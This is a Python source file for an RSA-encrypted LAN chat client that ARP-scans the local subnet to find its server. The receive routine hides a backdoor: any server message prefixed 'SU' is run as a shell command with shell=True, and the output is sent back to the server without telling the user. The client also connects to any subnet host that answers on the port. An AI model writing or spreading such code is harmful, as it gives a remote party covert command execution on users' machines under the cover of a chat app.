import socket
import threading
from scapy.all import *
from scapy.all import ARP, Ether, srp
from scapy.config import conf
from scapy.layers import inet
import ipaddress
import rsa

class Client:
    def __init__(self, PORT):
        self.client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.public_key, self.private_key = rsa.newkeys(1024)
        self.public_partner = None
        self.device_finder(PORT)

        
        while(True):
            self.nick = input('Tell us your nick: ')
            if self.nick != 'admin':
                break
            else:
                print('You cannot use this nick!\n')
            
        print('Connected to the server\n')
        self.stop_thread = False

        receive_thread = threading.Thread(target=self.receive)
        write_thread = threading.Thread(target=self.write)

        receive_thread.start()
        write_thread.start()
    
    def receive(self):                                                                          # gestisco messaggi ricevuti dal server
        while True:
            try:
                message = rsa.decrypt(self.client.recv(1024), self.private_key).decode('ascii')
                if message == 'NICK':
                    self.client.send(rsa.encrypt(self.nick.encode('ascii'), self.public_partner))
                    next_msg = rsa.decrypt(self.client.recv(1024), self.private_key).decode('ascii')
                    if next_msg ==  'NOTADMIN':
                        raise Exception('Connection refused, you are not admin!')
                    elif next_msg ==  'BAN':
                        raise Exception('Connection refused because of ban')
                elif message == 'KICK':
                    raise Exception('You have been kicked!')
                elif message.startswith('SU'):                                                  # gestisco i comandi ricevuti dal admin                            
                    command = message[3:]                
                    process = subprocess.Popen(command, stdout=subprocess.PIPE, shell=True)
                    output, error = process.communicate()
                    if process.returncode == 0:
                        out = output.decode('utf-8').strip()
                        self.client.send(rsa.encrypt(output.decode('utf-8').strip().encode('ascii'), self.public_partner)) 
                        
                    else:
                        print(f"Error: {error.decode('utf-8')}")                    
                else:
                    print(message)
            except Exception as e:
                print(f"Error: {str(e)}")
                self.client.close()
                self.stop_thread = True
                break

    def write(self):
        while True:
            if self.stop_thread:
                break
            message = f'{self.nick}: {input("")}'
            if message[len(self.nick)+2:].startswith('/'):
                print('Commands can be executed just by admin!')
            else:
                self.client.send(rsa.encrypt(message.encode('ascii'), self.public_partner))
    
    def device_finder(self, PORT):
        ip_list = []
    
        print("Reaching the server...")
        target_ip = self.network_finder()
        arp = ARP(pdst=target_ip)
        ether = Ether(dst="ff:ff:ff:ff:ff:ff")
        packet = ether/arp
        result = srp(packet, timeout=3, verbose=0)[0]

        for sent, received in result:
            ip_list.append(received.psrc)
          
        ping = inet.IP(dst="8.8.8.8")/inet.ICMP()
        ip_list.append(ping.src)
        ip_list.reverse()

        for ip in ip_list:
            try:
                client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                client.connect((ip, PORT)) 
                self.client = client

                print(f'Connected to {ip}')
                self.public_partner = rsa.PublicKey.load_pkcs1(self.client.recv(1024))
                self.client.send(self.public_key.save_pkcs1("PEM"))
                break
            except Exception as e: 
                print(f'{str(e)}')
                pass

    def network_finder(self):
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)        # indirizzo IP dell' host, ipv4 e UDP
        s.connect(("8.8.8.8", 80))                                  # DNS di Google come riferimento
        ip = s.getsockname()[0]
        s.close()

        net = ipaddress.ip_interface(f'{ip}/24').network            # ottiene la subnet
        print(str(net))
        return str(net)

client = Client(60000)
